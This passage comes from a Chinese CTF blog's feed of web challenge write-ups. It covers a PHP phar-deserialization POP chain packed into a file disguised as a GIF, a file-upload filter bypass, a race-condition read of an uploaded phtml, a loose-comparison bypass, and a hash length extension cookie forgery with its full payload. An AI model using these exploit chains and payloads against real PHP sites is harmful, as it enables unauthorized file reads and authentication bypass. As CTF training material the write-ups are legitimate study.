</span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>); </span><br><span class="line">    $temp = explode(<span class="string">"."</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>; </span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到出现了类，思路就基本上是php反序列化了，但是代码中并没有反序列化函数的调用，但是在file.php中看到存在file_exists()函数，该函数是可以通过phar协议实现反序列化的<a href="https://www.freebuf.com/company-information/187071.html" target="_blank" rel="noopener">参考文章</a>，接下里的思路就是构造pop链，题目中有提示 <code>&lt;!--flag is in f1ag.php--&gt;</code> ，所以要尝试读取f1ag.php文件</p><p>在Show类的<strong>show方法中过滤了f1ag字段，那么这个方法应该不行，看了大佬的pop链构造思路，Test类中有file_get_contents()函数可以读取文件内容，所以可以尝试反序列化Test类，file_get()方法被get方法调用，而get方法是被</strong>get()魔术方法调用</p><blockquote><p> 当读取不可访问属性的值时，__get() 会被调用。也就是，当想要获取一个类的私有属性，或者获取一个类并为定义的属性时。该魔术方法会被调用。 </p></blockquote><p>可以看到我们需要访问一个不可访问的变量，在Show中的<strong>toString()方法中，运行了 <code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source;</code>，该语句会访问不存在的变量source，所以接下来就是要触发</strong>toString()方法，正好在C1e4r类中<strong>destruct()类中 <code>echo $this-&gt;test;</code> 则会触发</strong>toString()方法，至此pop链构造完成:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.C1e4r类的__destruct()中的echo $this-&gt;test;</span><br><span class="line">2.Show中的__toString()中的$content = $this-&gt;str[&apos;str&apos;]-&gt;source;</span><br><span class="line">3.Test中的__get()方法</span><br><span class="line">4.利用file_get_contens()读文件</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;params = <span class="keyword">array</span>(<span class="string">"source"</span>=&gt;<span class="string">'/var/www/html/f1ag.php'</span>);</span><br><span class="line">$b = <span class="keyword">new</span> Show(<span class="string">'index.php'</span>);</span><br><span class="line">$b-&gt;str[<span class="string">'str'</span>] = $a;</span><br><span class="line">$c= <span class="keyword">new</span> C1e4r($b);</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line">$obj = unserialize(<span class="string">'O:5:"C1e4r":2:&#123;s:4:"test";N;s:3:"str";O:4:"Show":2:&#123;s:6:"source";s:9:"index.php";s:3:"str";a:1:&#123;s:3:"str";O:4:"Test":2:&#123;s:4:"file";N;s:6:"params";a:1:&#123;s:6:"source";s:22:"/var/www/html/f1ag.php";&#125;&#125;&#125;&#125;&#125;'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exploit.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.php'</span>, <span class="string">'test'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class="line">$phar-&gt;setMetadata($obj);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'exploit.phar'</span>, <span class="string">'skyfuck.gif'</span>);</span><br></pre></td></tr></table></figure><p>然后提交即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://upload/680b7502eaac53cac3f3eca74d50f537.jpg</span><br></pre></td></tr></table></figure><!-- SWPUCTF{Php_un$eri4liz3_1s_Fu^!} -->]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目复现&lt;/p&gt;
    
    </summary>
    
      <category term="复现" scheme="http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
      <category term="Web" scheme="http://chaosec.top/tags/Web/"/>
    
      <category term="Misc" scheme="http://chaosec.top/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>CUMT网络安全实训平台题目记录</title>
    <link href="http://chaosec.top/2018/12/07/cumtctf/"/>
    <id>http://chaosec.top/2018/12/07/cumtctf/</id>
    <published>2018-12-07T15:55:48.000Z</published>
    <updated>2019-01-31T04:28:04.010Z</updated>
    
    <content type="html"><![CDATA[<p>CUMT网络安全实训平台题目记录</p><a id="more"></a><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>查看源代码，在最后发现一段字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--该f配l合a你g演&#123;出y的o我u演f视i而n不d见m别e逼2一3个3最3爱3你3的3人3即3兴3表3演&#125;--&gt;</span><br></pre></td></tr></table></figure><p>提取出字符即可得到flag</p><h2 id="colorSnake"><a href="#colorSnake" class="headerlink" title="colorSnake"></a>colorSnake</h2><p>前端题目，一头雾水，看了别人的wp，查看源代码在页面地段可以看到有一个game.js，跟过去看一下，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xhr(<span class="string">'./getScore.php'</span>,function(e)&#123;</span><br><span class="line">                var r = JSON.parse(e);</span><br><span class="line">                <span class="keyword">if</span>(r.state == <span class="number">200</span>)</span><br><span class="line">                    game.addScore(r.score);</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    alert(r.msg);</span><br><span class="line">                    game.start()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br></pre></td></tr></table></figure><p>尝试在控制台提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setInterval(function()&#123;xhr(&apos;./getScore.php&apos;,function(e)&#123;</span><br><span class="line">                var r = JSON.parse(e);</span><br><span class="line">                if(r.state == 200)</span><br><span class="line">                    game.addScore(r.score);</span><br><span class="line">                else&#123;</span><br><span class="line">                    alert(r.msg);</span><br><span class="line">                    game.start()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)&#125;,1)</span><br></pre></td></tr></table></figure><p>会发现id确实增加了，我们可以通过修改参数使它实现多次递增从而达到50分，最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setInterval(function()&#123;xhr(&apos;./getScore.php&apos;,function(e)&#123;</span><br><span class="line">                var r = JSON.parse(e);</span><br><span class="line">                if(r.state == 200)</span><br><span class="line">                    game.addScore(r.score);</span><br><span class="line">                else&#123;</span><br><span class="line">                    alert(r.msg);</span><br><span class="line">                    game.start()</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)&#125;,1000)</span><br></pre></td></tr></table></figure><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><p>题目给出了信息</p><blockquote><p>1.bak 2.bak There are too much baks in the website ,can you find the flag in these baks?</p></blockquote><p>尝试访问1.bak，2.bak，没有发现flag，继续访问3.bak，4.bak等都存在文件，只是没有flag，猜测flag应该在某个*.bak，中，bp爆破一下，在998.bak中发现了flag</p><h2 id="上传一"><a href="#上传一" class="headerlink" title="上传一"></a>上传一</h2><p>题目要求上传jpg后缀，写一个PHP文件修改后缀为jpg，之后抓包修改文件名后缀为PHP再发包（因为它是在前端验证文件是否合法）</p><p><img src="/2018/12/07/cumtctf/2.png" alt="payload"></p><p>之后就可以惊喜的看到本题的flag和下个“上传2”题目的flag（2333..）</p><p><img src="/2018/12/07/cumtctf/3.png" alt="result"></p><h2 id="自动获取flag程序"><a href="#自动获取flag程序" class="headerlink" title="自动获取flag程序"></a>自动获取flag程序</h2><p>题目说了要修改一下程序，查看源代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求参数一</span></span><br><span class="line">$(<span class="string">"#a"</span>).click(function()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">'param1.php'</span>,</span><br><span class="line">        method:<span class="string">'get'</span>,</span><br><span class="line">        dataType:<span class="string">'json'</span>,</span><br><span class="line">        success:calParam2</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function">function <span class="title">calParam2</span><span class="params">(d)</span></span>&#123;</span><br><span class="line">    var data=JSON.parse((d.param));</span><br><span class="line">    var length=data.length;</span><br><span class="line">    var second=<span class="keyword">new</span> Date().getSeconds();</span><br><span class="line">    var sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (var i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (var j = <span class="number">0</span>; j &lt; length/<span class="number">2</span>; j++) &#123;</span><br><span class="line">            sum+=parseInt(data[i])*second + data[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 请求flag</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">'http://new.ctf.param.com/aram2.php?sum='</span>+sum,</span><br><span class="line">        method:<span class="string">'get'</span>,</span><br><span class="line">        dataType:<span class="string">'json'</span>,</span><br><span class="line">        success:function(s)&#123;</span><br><span class="line">            alert(s.f);</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line">        error:function(s)&#123;</span><br><span class="line">            alert(<span class="string">'错了'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到有个param1.php的请求，访问一下得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;param&quot;:&quot;[&quot;1&quot;,&quot;6&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;9&quot;,&quot;1&quot;,&quot;10&quot;]&quot;&#125;</span><br></pre></td></tr></table></figure><!-- flag{hello,This is A Gift FoRm PHP&JS; O(∩_∩)O~} --><h2 id="Cookie？"><a href="#Cookie？" class="headerlink" title="Cookie？"></a>Cookie？</h2><p>查看cookie发现user值为guest，改为admin再刷新即可</p><p><img src="/2018/12/07/cumtctf/5.png" alt="result"></p><p>一看就是维吉尼亚密码，解密一下就可以了</p><!-- flag{thisisanoldencrypt}<--><h2 id="上传二"><a href="#上传二" class="headerlink" title="上传二"></a>上传二</h2><p>见上传一</p><h2 id="logic"><a href="#logic" class="headerlink" title="logic"></a>logic</h2><p>查看源代码可以发现</p><p><img src="/2018/12/07/cumtctf/1.png" alt=""></p><p>应该是存在vim泄漏，尝试访问 <code>submit.php.swp</code> 发现泄漏文件，关键代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目一看就是很简单的弱比较，但是提交之后却无法正常回显，而是返回you are not admin，再看上图，admin应该就是chengyurui，所以邮箱为 <code>chenyurui@gmail.com</code> ，再提交一个<code>0e12345678</code> 即可。</p><h2 id="上传三"><a href="#上传三" class="headerlink" title="上传三"></a>上传三</h2><p>bp抓包尝试不同的后缀，尝试 <code>phtml</code> 发现可以上传成功，即上传 <code>snow.phtml</code> ，题目返回信息</p><p><img src="/2018/12/07/cumtctf/6.png" alt=""></p><p>可以看到我们的文件已经上传成功了(文件被执行了)，只是被后台查杀了，这就说明我们可以利用条件竞争来做这道题</p><p>用burpsuite连续发包，在写个代码连续读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://202.119.201.199/challenge/web/uploadfile/upload/snow.phtml"</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">content = requests.get(url).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> content:</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure><p>然后即可读到flag</p><!--flag{$$$_YOU_ARE_THE_BEST_GUY_HEIHEI_$$$}--><h2 id="is-hash-safe"><a href="#is-hash-safe" class="headerlink" title="is hash safe??"></a>is hash safe??</h2><p>题目给出了提示，应该是文件泄露，发现admin.php.swp存在，下载之，在linux下输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r amdin.php.swp</span><br></pre></td></tr></table></figure><p>即可恢复出源代码，核心代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$auth = <span class="keyword">false</span>;</span><br><span class="line">$role = <span class="string">"guest"</span>;</span><br><span class="line">$salt =<span class="string">"xxxxxxxxxxxxx"</span>;<span class="comment">//len:13</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) </span><br><span class="line">&#123;</span><br><span class="line">        $role = $_COOKIE[<span class="string">"role"</span>];</span><br><span class="line">        $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">        <span class="keyword">if</span> (stripos($role,<span class="string">"admin"</span>)!==<span class="keyword">false</span>&amp;&amp;$hsh === md5($salt.$_COOKIE[<span class="string">"role"</span>])) </span><br><span class="line">        &#123;</span><br><span class="line">                $auth = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                $auth = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">        $s = $role;</span><br><span class="line">        setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">        $hsh = md5($salt.$s);</span><br><span class="line">        setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin.Your flag is cumtctf&#123;you_know_this_is_not_the_flag&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一看就是哈希长度扩展攻击</p><p><a href="https://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="noopener">原理介绍</a><br><a href="https://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">工具介绍</a></p><p>我们可以用hashpump工具来做</p><p>由上面介绍的原理可以知道，在本题中，参与第一次md5哈希的可控字符串为guest，也就是说，本题中，我们已知的内容有$salt（代码加的盐，具体内容未知）的长度为13，$salt与guest拼接后的MD5哈希值c70ab9d039f166c5b5f506a5698ebaa1，那么基于此，我们可以构造哈希扩展攻击</p><p><img src="/2018/12/07/cumtctf/4.png" alt=""></p><p>Input signature输入明文哈希，Input data输入第一次参与哈希的字符串的结尾的一部分，长度为$salt长度加上去掉inputdata之后字符串的长度，附加值随便，但是不能空，由于本题需要role中存在admin，所以我追加的是admin。比如本题中原来第一次参与hash的字符串为guest，我选择最后一个字符t作为inputdata，那么长度就为<code>len($salt)+len(&#39;gues&#39;)=17</code>，之后就会返回构造好的字符串和哈希值，把上面的<code>\x</code>替换为<code>%</code>，之后修改cookie值，<code>role=&gt;guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin</code>，<code>hsh=&gt;37d0fe2c401a689be9608e9f850ef3de</code>，再刷新就可以得到flag了。</p><!--cumtctf{Md5_1s_n0t_safe} --><h2 id="淘金"><a 